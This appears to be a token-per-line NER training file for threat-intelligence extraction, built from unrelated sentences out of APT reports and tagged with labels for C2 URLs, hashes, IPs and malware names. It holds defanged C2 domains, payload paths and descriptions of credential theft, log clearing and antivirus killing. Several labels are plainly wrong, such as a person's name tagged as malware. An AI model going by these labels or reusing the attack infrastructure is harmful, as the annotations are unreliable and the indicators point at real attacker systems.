)	O
is	O
one	O
of	O
the	O
activity	O
groups	O
that	O
has	O
been	O
very	O
active	O
in	O
recent	O
years	O
,	O
and	O
has	O
many	O
distinctive	O
features	O
.	O

Even	O
when	O
we	O
observed	O
LuckyMouse	O
using	O
weaponized	O
documents	O
with	O
CVE-2017	O
-118822	O
(	O
Microsoft	O
Office	O
Equation	O
Editor	O
,	O
widely	O
used	O
by	O
Chinese-speaking	O
actors	O
since	O
December	O
2017	O
)	O
,	O
we	O
can	O
́t	O
prove	O
they	O
were	O
related	O
to	O
this	O
particular	O
attack	O
.	O

We	O
are	O
surprised	O
to	O
see	O
this	O
piece	O
of	O
code	O
has	O
been	O
used	O
carrying	O
out	O
targeted	O
attacks	O
rather	O
than	O
broader	O
criminal	O
activities	O
.	O

cptur	O
copies	O
files	O
from	O
one	O
location	O
to	O
another	O
copies	O
files	O
from	O
one	O
location	O
to	O
another	O
setting	O
copied	O
files	O
as	O
hidden	O
creates	O
a	O
directory	O
and	O
copies	O
file	O
to	O
that	O
directory	O
silently	O
deletes	O
directory	O
(	O
performs	O
an	O
FO_DELETE	O
shell	O
file	O
operation	O
on	O
a	O
directory	O
with	O
the	O
FOF_NOERRORUI	O
,	O
FOF_NOCONFIRMATION	O
,	O
and	O
FOF_SILENT	O
flags	O
set	O
)	O
deletes	O
a	O
file	O
deletes	O
a	O
file	O
after	O
setting	O
attributes	O
to	O
normal	O
recursively	O
writes	O
and	O
reads	O
encoded	O
data	O
to/from	O
a	O
directory	O
prints	O
directory	O
listings	O
to	O
~FF323D.tmp	O
;	O
data	O
gets	O
encoded	O
;	O
original	O
~FF323D.tmp	O
file	O
is	O
deleted	O
writes	O
and	O
reads	O
encoded	O
data	O
to/from	O
a	O
file	O
delu	O
gdir	O
netui3.dll	O
(	O
setup35.exe	O
)	O

Are	O
there	O
any	O
major	O
differences	O
in	O
the	O
variants	O
?	O

3	O
,	O
2013	O
with	O
2003	O
connections	O
and	O
the	O
lowest	O
was	O
Jan	O
.	O

0beb2eb1214d4fd78e1e92db579e24d12e875be553002a778fb38a225cadb703	O
70dc2a4d9da2b3338dd0fbd0719e8dc39bc9d8e3e959000b8c8bb04c931aff82	O
835e759735438cd3ad8f4c6dd8b035a3a07d6ce5ce48aedff1bcad962def1aa4	O
C14f859eed0f4540ab41362d963388518a232deef8ecc63eb072d5477e151719	O
ed0eadd8e8e82e7d3829d71ab0926c409a23bf2e7a4ff6ea5b533c5defba4f2a	O
f4806c5e4449a6f0fe5e93321561811e520f738cfe8d1cf198ef12672ff06136	O
911269e72cd6ed4835040483c4860294d26bfb3b351df718afd367267cd9024f	O
fb7aa28a9d8fcfcabacd7f390cee5a5ed67734602f6dfa599bff63466694d210	O
ef4769606adcd4f623eea29561596e5c0c628cb3932b30428c38cfe852aa8301	O
cd140cf5a9030177316a15bef19745b0bebb4eb453ddb4038b5f15dacfaeb3a2	O
07682c1626c80fa1bb33d7368f6539edf8867faeea4b94fedf2afd4565b91105	O
9f30163c0fe99825022649c5a066a4c972b76210368531d0cfa4c1736c32fb3a	O
1993f8d2606c83e22a262ac93cc9f69f972c04460831115b57b3f6244ac128bc	O
99dd67915566c0951b78d323bb066eb5b130cc7ebd6355ec0338469876503f90	O
1c0ea462f0bbd7acfdf4c6daf3cb8ce09e1375b766fbd3ff89f40c0aa3f4fc96	O
hxxp://cone[.]msoftupdates.com:46769	B-url.cncsvr
hxxp://ctwo[.]msoftupdates.com:46769	B-url.cncsvr
hxxp://cthree[.]msoftupdates.com:46769	B-url.cncsvr
hxxp://eone[.]msoftupdates.eu:46769	B-url.cncsvr
hxxp://etwo[.]msoftupdates.eu:46769	B-url.cncsvr
hxxp://msupdates[.]mylogisoft.com:46769	B-url.cncsvr
hxxp://coreupdate[.]msoftupdates.com:46769	B-url.cncsvr
hxxp://updateserver[.]msoftupdates.eu:46769	B-url.cncsvr
hxxp://updateserver[.]msoftupdates.eu:46769	B-url.normal
msoftupdates[.]com	B-url.normal
msoftupdates[.]eu	B-url.normal
mylogisoft[.]com	B-url.normal
URI	O
:	O
/Gvty@/1ns3rt_39291384.php	O
/Gvty@/newIns3rt.php	O
/Gvty	O
@	O
/payloads	O
/Gvty@/ip.php	O
/G3/ServerSide/G3.php	O
/G3/Payload/	O
/GX/GX-Server.php	O
/GetActiveDomains.php	O

However	O
,	O
the	O
way	O
it	O
operates	O
is	O
very	O
strategic	O
:	O
It	O
hides	O
in	O
plain	O
sight	O
.	O

3	O
Jan	O
.	O

(	O
active	O
)	O
http://[REDACTED]om/g.php?url=	B-url.normal
http://www.youtube.com/watch?v=jDkluDCn7fA	I-url.normal
(	O
defunct	O
)	O
http://google-panel.html-5.me/g.php?url=	B-url.normal
http://www.youtube.com/watch?v=Uw3Ny2A1WvQ	I-url.normal
(	O
defunct	O
)	O
http://for-google.allalla.com/u.php?url=	B-url.normal
http://www.alkalimaonline.com/news.php?id=118868	I-url.normal

As	O
we	O
started	O
digging	O
into	O
the	O
operation	O
,	O
more	O
details	O
emerged	O
which	O
supported	O
this	O
theory	O
.	O

Stuxnet	B-malware.backdoor
and	O
Duqu	B-malware.infosteal
are	O
two	O
of	O
them	O
-	O
there	O
could	O
have	O
been	O
others	O
,	O
which	O
for	O
now	O
remain	O
unknown	O
.	O

This	O
routine	O
is	O
a	O
copied	O
code	O
from	O
the	O
'	O
Pafish	O
'	O
open	O
source	O
project	O
,	O
led	O
by	O
Alberto	B-malware.unknown
Ortega	I-malware.unknown
(	O
@	O
a0rtega	O
)	O
who	O
describes	O
it	O
as	O
:	O
'	O
A	O
demonstration	O
tool	O
that	O
employs	O
several	O
techniques	O
to	O
detect	O
sandboxes	O
and	O
analysis	O
environments	O
in	O
the	O
same	O
way	O
as	O
malware	O
families	O
do	O
'	O
.	O

A	O
video	O
posted	O
on	O
18	O
October	O
2015	O
specifically	O
shows	O
them	O
employing	O
the	O
30.apk	B-malware.backdoor
application	O
and	O
operating	O
in	O
the	O
vicinity	O
of	O
eastern	O
Ukraine	O
.	O

21	O
Oct	O
.	O

It	O
's	O
quite	O
odd	O
(	O
and	O
probably	O
underreported	O
)	O
,	O
however	O
,	O
to	O
see	O
it	O
used	O
as	O
a	O
vector	O
for	O
cyberespionage	B-malware.backdoor
.	O

이때	O
'	O
Anonymous	B-malware.unknown
?	O

Based	O
on	O
that	O
information	O
malware	O
operator	O
decides	O
whether	O
the	O
infected	O
computer	O
is	O
useful	O
:	O
that	O
is	O
,	O
whether	O
it	O
's	O
the	O
intended	O
target	O
or	O
just	O
a	O
system	O
that	O
was	O
accidentally	O
infected	O
.	O

Interestingly	O
enough	O
,	O
these	O
new	O
samples	O
now	O
connect	O
to	O
the	O
new	O
attack	O
infrastructure	O
.	O

'.exe	O
(	O
blind	O
love	O
game	O
–	O
chapter	O
G	O
)	O
Ynet	O
news	O

Additional	O
ways	O
our	O
customers	O
can	O
detect	O
and	O
block	O
this	O
threat	O
are	O
listed	O
below	O
.	O

2e2d1315c47db73ba8facb99240ca6c085a9acbc	B-hash

The	O
format	O
is	O
:	O

The	O
stealer	O
searches	O
for	O
files	O
60mb	O
and	O
less	O
with	O
these	O
extensions	O
:	O
<	O
/p	O
style='margin-bottom:0	O
!	O
important	O
'	O
>	O
.doc	O
.docx	O
.xls	O
.xlsx	O
.ppt	O
.pptx	O
.exe	O
.zip	O
.rar	O
At	O
execution	O
,	O
it	O
installs	O
an	O
application-defined	O
Windows	O
hook	O
.	O

Here	O
,	O
we	O
examine	O
current	O
deployment	O
,	O
code	O
,	O
cryptography	O
,	O
and	O
targeting	O
.	O

fails	O
because	O
notmyser	O
does	O
not	O
match	O
an	O
attached	O
drive	O
this	O
S/N	O
is	O
from	O
actually	O
attached	O
drive	O
success	O
copies	O
data	O
from	O
ext.drv\RECYCLED\RECYCLED\SYS	O
to	O
<	O
CSIDL_NETHOOD	O
>	O
\Microsoft\Intel	O
(	O
Note	O
:	O
before	O
copy	O
checks	O
if	O
file	O
exists	O
in	O
\Intel	O
and	O
determines	O
file	O
size	O
-­‐	O
the	O
implication	O
is	O
the	O
possibility	O
of	O
updating	O
previously	O
retrieved	O
files	O
)	O
00	O
acts	O
a	O
wildcard	O
for	O
volume	O
serial	O
number	O
did	O
not	O
execute	O
because	O
a	O
volume	O
serial	O
number	O
(	O
d81596a9	O
)	O
was	O
previously	O
found	O
getres	O
@	O
@	O
00	O
collect	O
data	O
harvested	O
from	O
a	O
targeted	O
system	O
designates	O
any	O
connected	O
drive	O
retrieve	O
a	O
directory	O
listing	O
dir	O
5	O

Beebus	O
Arid	O
Viper	O
Red	O
October	O
Equation	O
Paci c	O
RAT	O
Regin	O
Aurora	O
Pitty	O
Tiger	O
Net	O
Traveller	O
BrutPOS	O

Xagent	O
–	O
A	O
variant	O
of	O
'	O
JbossMiner	O
Mining	O
Worm	O
'	O
–	O
a	O
worm	O
written	O
in	O
Python	O
and	O
compiled	O
using	O
PyInstaller	O
for	O
both	O
Windows	O
and	O
Linux	O
platforms	O
.	O

Accenture	O
Security	O
helps	O
organizations	O
build	O
resilience	O
from	O
the	O
inside	O
out	O
,	O
so	O
they	O
can	O
confidently	O
focus	O
on	O
innovation	O
and	O
growth	O
.	O

//	O
xor	O
//	O
inc	O
//	O
cmp	O
eax	O
,	O
14h	O
//	O
Loop	O
to	O
decode	O
a	O
static	O
string	O
.	O

28	O
.	O

Following	O
you	O
can	O
see	O
the	O
portion	O
of	O
the	O
code	O
where	O
the	O
backdoor	O
,	O
after	O
having	O
verified	O
which	O
version	O
of	O
Mozilla	O
Firefox	O
is	O
installed	O
on	O
the	O
system	O
,	O
decides	O
which	O
technique	O
to	O
use	O
to	O
recover	O
the	O
credentials	O
from	O
the	O
browser	O
's	O
local	O
storage	O
.	O

Mountain	O
View	O
,	O
CA	O
94043	O
USA	O
+1	O
(	O
650	O
)	O
527-8000	O
1	O
(	O
800	O
)	O
721-3934	O

However	O
,	O
the	O
attacks	O
against	O
targets	O
in	O
the	O
Middle	O
East	O
(	O
except	O
Israel	O
)	O
were	O
renewed	O
in	O
less	O
than	O
20	O
days	O
.	O

Notes	O
:	O
32-bit	O
version	O
of	O
malware	O
,	O
which	O
beacons	O
to	O
58.64.178.77:443	B-ip.unknown
.	O

The	O
fifth	O
technique	O
counts	O
the	O
number	O
of	O
cores	O
in	O
the	O
infected	O
system	O
(	O
the	O
author	O
expects	O
more	O
than	O
one	O
core	O
)	O
The	O
sixth	O
technique	O
checks	O
the	O
current	O
CPU	O
temperature	O
of	O
the	O
system	O
(	O
the	O
MSAcpi_ThermalZoneTemperature	O
entry	O
)	O
.	O

By	O
then	O
,	O
the	O
authors	O
had	O
switched	O
to	O
encrypting	O
the	O
strings	O
and	O
the	O
configuration	O
.	O

It	O
is	O
using	O
our	O
own	O
utility	O
function	O
RetrieveFunctionInstructions	O
which	O
returns	O
a	O
list	O
of	O
op-code	O
and	O
operand	O
values	O
from	O
a	O
designated	O
function	O
.	O

But	O
the	O
Base64-decoded	O
traffic	O
shows	O
an	O
attempt	O
to	O
decode	O
more	O
Base64	O
traffic	O
stored	O
as	O
'	O
z1	O
'	O
and	O
'	O
z2	O
.	O
'	O

Fake	O
DLL	O
:	O
product_info.dll	O
(	O
3cf4b44c9470fb5bd0c16996c4b2a338502a7517	B-hash
)	O
By	O
exploiting	O
legitimate	O
software	O
,	O
the	O
attackers	O
bypassed	O
application	O
whitelisting	O
and	O
legitimate	O
security	O
software	O
,	O
allowing	O
them	O
to	O
continue	O
their	O
operations	O
without	O
raising	O
any	O
suspicions	O
.	O

This	O
certificate	O
configuration	O
is	O
ignored	O
by	O
the	O
malware	O
.	O

The	O
short	O
links	O
in	O
the	O
spearphishing	O
emails	O
redirected	O
victims	O
to	O
a	O
TG-4127-controlled	B-malware.infosteal
URL	O
that	O
spoofed	O
a	O
legitimate	O
Google	O
domain	O
.	O

At	O
a	O
diminutive	O
28	O
bytes	O
,	O
it	O
is	O
one	O
of	O
the	O
smallest	O
Active	O
Server	O
Page	O
(	O
ASP	O
)	O
backdoors	O
in	O
the	O
wild	O
.	O

Note	O
how	O
worldvoicetrip[.]com	B-url.cncsvr
can	O
supply	O
a	O
new	O
C	O
&	O
C	O
server	O
(	O
'	O
code4	O
'	O
)	O
in	O
domain.html	O
.	O

Cloud	B-malware.unknown
Atlas	I-malware.unknown
RedOctober	B-malware.unknown

4	O

The	O
hostname	O
and	O
OS	O
information	O
are	O
also	O
included	O
in	O
the	O
beacon	O
.	O

Sofacy	O
,	O
Sednit	O
,	O
Sourface	O
,	O
APT-28	O
,	O
and	O
a	O
host	O
of	O
other	O
names	O
are	O
all	O
used	O
to	O
describe	O
this	O
particularly	O
prolific	O
and	O
superbly	O
talented	O
group	O
of	O
Russian	O
hackers	O
,	O
which	O
has	O
strongly	O
suspected	O
ties	O
to	O
Russian	O
intelligence	O
services	O
.	O

KB647164.exe	O

ARMED	O
CONFLICT	O
IN	O
UKRAINE	O

Compiled	O
Time	O
Stamp	O
:	O
2018-01-18	O
04:38:12	O
(	O
Jan	O
.	O

This	O
log	O
file	O
is	O
written	O
to	O
the	O
same	O
directory	O
as	O
the	O
config	O
file	O
and	O
has	O
a	O
'	O
.dat	O
'	O
extension	O
.	O

The	O
malicious	O
macro	O
's	O
code	O
snippet	O
uses	O
three	O
main	O
functions	O
,	O
specifically	O
:	O
The	O
function	O
contained	O
in	O
the	O
box	O
is	O
the	O
Document_Open	O
(	O
)	O
event	O
,	O
where	O
all	O
the	O
subfunctions	O
will	O
be	O
executed/called	O
.	O

Most	O
of	O
the	O
publicly	O
available	O
tools	O
were	O
either	O
obfuscated	O
,	O
modified	O
and	O
even	O
merged	O
with	O
other	O
tools	O
to	O
evade	O
antivirus	O
detection	O
.	O

20	O
Oct	O
.	O

The	O
malware	O
then	O
enumerates	O
all	O
processes	O
,	O
searching	O
for	O
specific	O
anti-virus	O
processes	O
and	O
attempts	O
to	O
kill	O
these	O
using	O
the	O
command	O
line	O
tool	O
taskkill.Process	O
Description	O
Trend	O
Micro	O
Unauthorized	O
Change	O
Prevention	O
Service	O
Trend	O
Micro	O
OfficeScan	O
NT	O
RealTime	O
Scan	O
Trend	O
Micro	O
OfficeScan	O
Common	O
Client	O
Solution	O
Framework	O
Process	O
Name	O

MADE	O
PUBLIC	O

Publicly	O
available	O
tools	O
-	O
The	O
attackers	O
showed	O
a	O
clear	O
preference	O
to	O
use	O
publicly	O
available	O
hacking	O
tools	O
and	O
frameworks	O
.	O

While	O
TG-4127	B-malware.infosteal
continues	O
to	O
primarily	O
threaten	O
organizations	O
and	O
individuals	O
operating	O
in	O
Russia	O
and	O
former	O
Soviet	O
states	O
,	O
this	O
campaign	O
illustrates	O
its	O
willingness	O
to	O
expand	O
its	O
scope	O
to	O
other	O
targets	O
that	O
have	O
intelligence	O
of	O
interest	O
to	O
the	O
Russian	O
government	O
.	O

Most	O
of	O
the	O
bait	O
attachments	O
are	O
Word	O
documents	O
,	O
and	O
Word	O
documents	O
can	O
contain	O
metadata	O
(	O
typically	O
the	O
usernames	O
of	O
the	O
creator	O
and	O
the	O
one	O
who	O
last	O
saved	O
the	O
document	O
)	O
.	O

Next	O
,	O
the	O
script	O
uses	O
a	O
special	O
User-Agent	O
access	O
URL	O
page	O
to	O
request	O
the	O
next	O
load	O
and	O
execute	O
.	O

This	O
could	O
then	O
be	O
used	O
to	O
tailor	O
future	O
attacks	O
(	O
i.e.	O
should	O
I	O
deploy	O
malware	O
which	O
can	O
bypass	O
UAC	O
?	O

주요	O
문자열	O
앞에	O
'S^	O
%	O
'	O
가	O
붙는	O
것이	O
특	O
징이다	O
(	O
S^%s\cmd.exe	O
,	O
S^nehomegpa.dll	O
'	O
등	O
)	O
.	O

French	O
(	O
France	O
)	O
.	O

facebook.com/profile.php?id=100013563997788	B-url.unknown
facebook.com/profile.php?id=100011377795504	B-url.unknown
facebook.com/profile.php?id=100011891805784	B-url.unknown

This	O
campaign	O
is	O
still	O
ongoing	O
with	O
Mutter	B-malware.backdoor
callbacks	O
being	O
made	O
to	O
this	O
day	O
.	O

Umair	O
Aziz	O
(	O
)	O
maintains	O
a	O
LinkedIn	O
professional	O
profile	O
that	O
highlights	O
his	O
employment	O
at	O
Tranchulas	O
and	O
reveals	O
that	O
he	O
was	O
educated	O
at	O
the	O
National	O
University	O
of	O
Sciences	O
and	O
Technology	O
School	O
of	O
Electrical	O
Engineering	O
and	O
Computer	O
Science	O
(	O
NUST-SEECS	O
)	O
in	O
Pakistan	O
.	O

After	O
http://www.viktor-khrapunov.com/en/publications-en/mediapart/	B-url.normal
analyzing	O
closely	O
your	O
requirements	O
and	O
the	O
physical	O
and	O
cyber	O
environments	O
in	O
which	O
you	O
must	O
operate	O
,	O
Arcanum	O
Global	O
's	O
holistic	O
team	O
of	O
technical	O
,	O
operational	O
and	O
management	O
specialists	O
will	O
recommend	O
specific	O
(	O
and	O
potentially	O
sensitive	O
)	O
solutions	O
–	O
and	O
then	O
stand	O
beside	O
you	O
to	O
implement	O
them	O
and	O
assure	O
you	O
realize	O
your	O
goals	O
and	O
achieve	O
mission	O
success	O
.	O

They	O
also	O
engaged	O
in	O
a	O
number	O
of	O
anti-forensic	O
analysis	O
measures	O
,	O
such	O
as	O
periodic	O
event	O
log	O
clearing	O
(	O
via	O
wevtutil	O
cl	O
System	O
and	O
wevtutil	O
cl	O
Securitycommands	O
)	O
and	O
resetting	O
timestamps	O
of	O
files	O
.	O

Checks	O
if	O
ProcessExplorer	O
is	O
running	O
.	O

The	O
attackers	O
use	O
the	O
technique	O
of	O
replacing	O
the	O
standard	O
characters	O
with	O
custom	O
characters	O
to	O
makes	O
it	O
difficult	O
to	O
decode	O
the	O
string	O
(	O
containing	O
the	O
characters	O
'	O
+	O
'	O
and	O
'	O
/	O
'	O
)	O
using	O
standard	O
base64	O
algorithm	O
.	O

Each	O
request	O
results	O
in	O
an	O
HTTP	O
403	O
response	O
from	O
the	O
server	O
.	O

And	O
as	O
mentioned	O
before	O
,	O
a	O
special	O
thanks	O
to	O
our	O
friends	O
at	O
Palo	O
Alto	O
for	O
their	O
contributions	O
on	O
clustering	O
BlackEnergy	O
samples	O
.	O

Individual	O
in	O
Sri	O
Lanka	O
cashes	O
out	O
a	O
reported	O
Rs30m	O
(	O
~	O
$	O
195,000	O
)	O
.	O

Both	O
WinRAR	O
and	O
TrueCrypt	O
help	O
provide	O
strong	O
and	O
reliable	O
encryption	O
.	O

An	O
intuitive	O
indicator	O
of	O
this	O
sophistication	O
is	O
that	O
it	O
was	O
completely	O
preventable	O
if	O
the	O
organizations	O
had	O
used	O
existing	O
software	O
updates	O
and	O
antivirus	O
solutions	O
,	O
whereas	O
prior	O
attacks	O
could	O
not	O
have	O
been	O
detected	O
.	O

29	O
Dec	O
.	O

Index.html	O
:	O
HTML	O
page	O
referring	O
to	O
a	O
fake	O
Firefox	O
download	O
page	O
.	O

Targeted	O
attacks	O
pose	O
a	O
challenge	O
to	O
traditional	O
signature-based	O
security	O
solutions	O
.	O

Apart	O
from	O
sending	O
the	O
system	O
information	O
and	O
process	O
information	O
to	O
the	O
C2	O
server	O
,	O
the	O
malware	O
also	O
has	O
the	O
capability	O
to	O
perform	O
various	O
other	O
tasks	O
by	O
taking	O
command	O
from	O
the	O
C2	O
.	O

No	O
persistency	O
mechanisms	O
have	O
been	O
identified	O
.	O

Below	O
screen	O
shot	O
shows	O
the	O
logic	O
used	O
to	O
extract	O
the	O
filename	O
and	O
the	O
command	O
string	O
,	O
in	O
the	O
below	O
screen	O
shot	O
the	O
extracted	O
command	O
string	O
is	O
stored	O
in	O
the	O
variable	O
ServerTask1Permission	O
.	O

Crypto	O
Key	O
Prefix	O
(	O
Default	O
)	O

TsLow	B-malware.unknown
is	O
an	O
additional	O
attacker	O
module	O
that	O
implements	O
the	O
TriStation	O
UDP	O
wire	O
protocol	O
.	O

This	O
technique	O
of	O
storing	O
a	O
text	O
file	O
containing	O
the	O
list	O
of	O
backup	O
C2	O
servers	O
on	O
the	O
legitimate	O
site	O
has	O
advantages	O
and	O
it	O
is	O
highly	O
unlikely	O
to	O
trigger	O
any	O
suspicion	O
in	O
security	O
monitoring	O
and	O
also	O
can	O
bypass	O
reputation	O
based	O
devices	O
.	O

It	O
features	O
high-fidelity	O
machine	O
learning	O
to	O
secure	O
the	O
gateway	O
and	O
endpoint	O
data	O
and	O
applications	O
,	O
and	O
protects	O
physical	O
,	O
virtual	O
,	O
and	O
cloud	O
workloads	O
.	O

Whether	O
the	O
infection	O
is	O
achieved	O
through	O
spearphishing	O
,	O
physical	O
access	O
to	O
a	O
system	O
or	O
the	O
Hacking	O
Team	O
Flash	O
0day	O
,	O
there	O
frequently	O
seems	O
to	O
be	O
a	O
common	O
method	O
for	O
a	O
newly-infected	O
system	O
to	O
communicate	O
with	O
Darkhotel	B-malware.infosteal
's	O
c2	O
:	O
A	O
lightly	O
obfuscated	O
(	O
double	O
escaped	O
set	O
of	O
javascript	O
variable	O
values	O
)	O
script	O
maintained	O
within	O
an	O
.hta	O
file	O
writes	O
an	O
executable	O
to	O
disk	O
and	O
executes	O
it	O
.	O

The	O
vulnerability	O
targets	O
Microsoft	O
XML	O
Core	O
Services	O
3.0	O
–	O
6.0	O
with	O
a	O
published	O
metasploit	O
exploit	O
targeting	O
MS	O
XML	O
Core	O
Services	O
3.0	O
via	O
IE6	O
and	O
IE7	O
over	O
Windows	O
XP.After	O
gaining	O
access	O
the	O
second	O
stage	O
downloader	O
file	O
(	O
sun.exe	O
)	O
performs	O
the	O
following	O
actions	O
:	O

At	O
location	O
4.	O
,	O
all	O
social	O
cyberspaces	O
used	O
by	O
XXXXXXX	O
were	O
then	O
enumerated	O
.	O

This	O
campaign	O
,	O
as	O
well	O
as	O
those	O
in	O
its	O
previous	O
form	O
,	O
uses	O
phishing	O
methods	O
to	O
deliver	O
its	O
reconnaissance	O
stage	O
malware	O
.	O

If	O
the	O
input	O
argument	O
is	O
addr	O
(	O
0x11223344	O
)	O
,	O
first	O
add	O
4	O
to	O
the	O
value	O
to	O
get	O
0x11223348	O
,	O
and	O
then	O
set	O
the	O
variant	O
type	O
to	O
8	O
(	O
string	O
type	O
)	O
.	O

The	O
StrongPity	O
controlled	O
Truecrypt	O
site	O
is	O
a	O
complete	O
rip	O
of	O
the	O
legitimate	O
site	O
,	O
now	O
hosted	O
by	O
Sourceforge	O
.	O

Once	O
this	O
DLL	O
is	O
de-obfuscated	O
,	O
we	O
observed	O
another	O
common	O
anti-behavioral	O
analysis	O
technique	O
used	O
to	O
try	O
and	O
extend	O
the	O
longevity	O
of	O
the	O
loaded	O
payload	O
's	O
usage	O
.	O

Develop	O
mechanisms	O
for	O
sanity	O
checking	O
IO	O
data	O
,	O
such	O
as	O
independent	O
sensing	O
and	O
backhaul	O
,	O
and	O
comparison	O
with	O
expected	O
process	O
state	O
information	O
.	O

We	O
also	O
found	O
some	O
clues	O
in	O
the	O
binary	O
that	O
indicate	O
that	O
the	O
tool	O
was	O
authored	O
and	O
built	O
by	O
someone	O
using	O
Chinese	O
fonts	O
on	O
their	O
computer	O
.	O

©	O
AhnLab	O
,	O
Inc	O
.	O

analysis	O
android	O
android	O
market	O

1	O
.	O

The	O
document	O
text	O
talks	O
about	O
disagreements	O
between	O
China	O
and	O
'	O
The	O
North	O
'	O
over	O
nuclear	O
programs	O
and	O
demilitarization	O
.	O

.exe	O
(	O
corporate	O
responsibility	O
and	O
sustainability	O
report	O
-	O
Egged	O
)	O

PCC_PROXY	O
:	O
:ReadWaitingData	O
returns	O
packets	O
from	O
a	O
transmit	O
queue	O
,	O
with	O
the	O
directionality	O
from	O
the	O
perspective	O
of	O
the	O
server	O
variant	O
.	O

Version	O
Information	O
7	O
.	O

On	O
September	O
12	O
,	O
2016	O
,	O
the	O
'	O
Fancy	O
Bears	O
'	O
Hack	O
Team	O
'	O
persona	O
claimed	O
to	O
have	O
compromised	O
WADA	O
and	O
released	O
athletes	O
'	O
medical	O
records	O
as	O
'	O
proof	O
of	O
American	O
athletes	O
taking	O
doping	O
.	O
'	O

Word	O
document	O
,	O
contained	O
in	O
SFX	O
RAR	O
file	O
940B3ACDF1E26FCCCF74A5A0359FB079	B-hash

The	O
malware	O
alters	O
the	O
value	O
of	O
registry	O
key	O
Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\ExtendedUIHoverTime	O
to	O
2710	O
in	O
order	O
to	O
change	O
the	O
number	O
of	O
milliseconds	O
a	O
thumbnail	O
is	O
showed	O
while	O
hovering	O
on	O
the	O
taskbar	O
,	O
as	O
seen	O
in	O
Figure	O
22	O
.	O

ShadowTech	B-malware.backdoor
Rat	I-malware.backdoor
is	O
a	O
Remote	O
Access	O
Trojan	B-malware.backdoor
which	O
appears	O
to	O
be	O
widely	O
available	O
for	O
download	O
on	O
both	O
English	O
and	O
Arabic	O
language	O
sites	O
.	O

IP	O
addresses	O

With	O
directory	O
traversal	O
activated	O
researchers	O
from	O
ESET	O
could	O
pull	O
a	O
minimalistic	O
directory	O
structure	O
,	O
showing	O
directories	O
named	O
as	O
follows	O
:	O
bb28	O
tfc422	O

The	O
first	O
four	O
executables	O
listed	O
in	O
the	O
previous	O
paragraph	O
were	O
used	O
as	O
infection	O
vectors	O
in	O
the	O
new	O
campaign	O
we	O
investigated	O
.	O

F68F85B0FBCA450F0D5C8828063AD30D	B-hash
menu.dyndns.biz	B-url.cncsvr

The	O
Trojan	O
's	O
command	O
and	O
control	O
command	O
structure	O
is	O
identical	O
to	O
the	O
first	O
sample	O
.	O

TV5Monde	O

To	O
learn	O
more	O
,	O
read	O
our	O
Security	O
101	O
:	O
Business	O
Process	O
Compromise	O
.	O

else	O

The	O
'	O
Payment	B-malware.infosteal
details.jar	I-malware.infosteal
'	O
malware	O
was	O
sent	O
in	O
a	O
phishing	O
email	O
that	O
contained	O
some	O
of	O
the	O
following	O
details	O
:	O

Next	O
,	O
the	O
intercepted	O
keystrokes	O
are	O
read	O
from	O
the	O
file	O
and	O
sent	O
to	O
the	O
master	O
.	O

File	O
name	O
SHA-1	O
hash	O

Both	O
replace	O
DLLs	O
to	O
achieve	O
process	O
manipulation	O
.	O

The	O
original	O
application	O
enabled	O
artillery	O
forces	O
to	O
more	O
rapidly	O
process	O
targeting	O
data	O
for	O
the	O
Soviet-era	O
D-30	O
Howitzer	O
employed	O
by	O
Ukrainian	O
artillery	O
forces	O
reducing	O
targeting	O
time	O
from	O
minutes	O
to	O
under	O
15	O
seconds	O
.	O

3	O
Executive	O
summary	O
4	O
Analysis	O

In	O
this	O
blog	O
post	O
,	O
we	O
analyze	O
ChessMaster	O
's	O
current	O
status	O
,	O
including	O
the	O
updated	O
tools	O
in	O
its	O
arsenal	O
—	O
with	O
a	O
particular	O
focus	O
on	O
the	O
evolution	O
of	O
ANEL	B-malware.backdoor
and	O
how	O
it	O
is	O
used	O
in	O
the	O
campaign	O
.	O

In	O
addition	O
,	O
the	O
modified	O
sshd	O
logs	O
all	O
legitimate	O
ssh	O
connections	O
(	O
this	O
does	O
not	O
apply	O
to	O
the	O
connection	O
that	O
uses	O
the	O
'	O
master	O
password	O
'	O
)	O
,	O
including	O
connection	O
times	O
,	O
account	O
names	O
and	O
passwords	O
.	O

It	O
is	O
possible	O
to	O
decrypt	O
the	O
traffic	O
because	O
the	O
key	O
is	O
prepended	O
to	O
the	O
packets	O
.	O

As	O
the	O
findings	O
of	O
a	O
new	O
malware	O
attack	O
campaign	O
named	O
INOCNATION	O
emerged	O
,	O
Fidelis	O
Threat	O
Research	O
investigated	O
the	O
Remote	O
Access	O
Tool	O
(	O
RAT	B-malware.backdoor
)	O
used	O
in	O
this	O
campaign	O
.	O

A	O
Bitcoin	O
address	O
is	O
an	O
identifier	O
of	O
26-35	O
alphanumeric	O
characters	O
which	O
represent	O
the	O
owner	O
of	O
a	O
Bitcoin	O
wallet	O
,	O
for	O
example	O
something	O
like	O
3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy	B-hash
.	O

Our	O
investigation	O
revealed	O
that	O
affected	O
companies	O
in	O
other	O
countries	O
had	O
VPN	O
connections	O
to	O
their	O
branches	O
,	O
or	O
to	O
business	O
partners	O
,	O
in	O
Ukraine	O
.	O

Additionally	O
,	O
the	O
Moafee	B-malware.infosteal
group	O
also	O
hosted	O
a	O
PoisonIvy	O
command	O
and	O
control	O
server	O
at	O
phi	O
.	O

In	O
2013	O
,	O
the	O
Sofacy	O
group	O
expanded	O
their	O
arsenal	O
and	O
added	O
more	O
backdoors	O
and	O
tools	O
,	O
including	O
CORESHELL	B-malware.backdoor
,	O
SPLM	B-malware.backdoor
(	O
aka	O
Xagent	B-malware.backdoor
,	O
aka	O
CHOPSTICK	B-malware.backdoor
)	O
,	O
JHUHUGIT	B-malware.backdoor
(	O
which	O
is	O
built	O
with	O
code	O
from	O
the	O
Carberp	O
sources	O
)	O
,	O
AZZY	B-malware.backdoor
(	O
aka	O
ADVSTORESHELL	B-malware.backdoor
,	O
NETUI	B-malware.backdoor
,	O
EVILTOSS	B-malware.backdoor
,	O
and	O
spans	O
across	O
4-5	O
generations	O
)	O
and	O
a	O
few	O
others	O
.	O

If	O
Koadic	B-malware.unknown
finds	O
that	O
the	O
system	O
is	O
conducive	O
to	O
the	O
attacker	O
's	O
interests	O
,	O
it	O
downloads	O
a	O
base64-encrypted	O
version	O
of	O
the	O
ANEL	B-malware.backdoor
malware	O
from	O
the	O
Command-and-Control	O
(	O
C	O
&	O
C	O
)	O
server	O
and	O
executes	O
it	O
.	O

Trend	O
Micro	O
and	O
the	O
Trend	O
Micro	O
t-ball	O
logo	O
are	O
trademarks	O
or	O
registered	O
trademarks	O
of	O
Trend	O
Micro	O
,	O
Incorporated	O
.	O

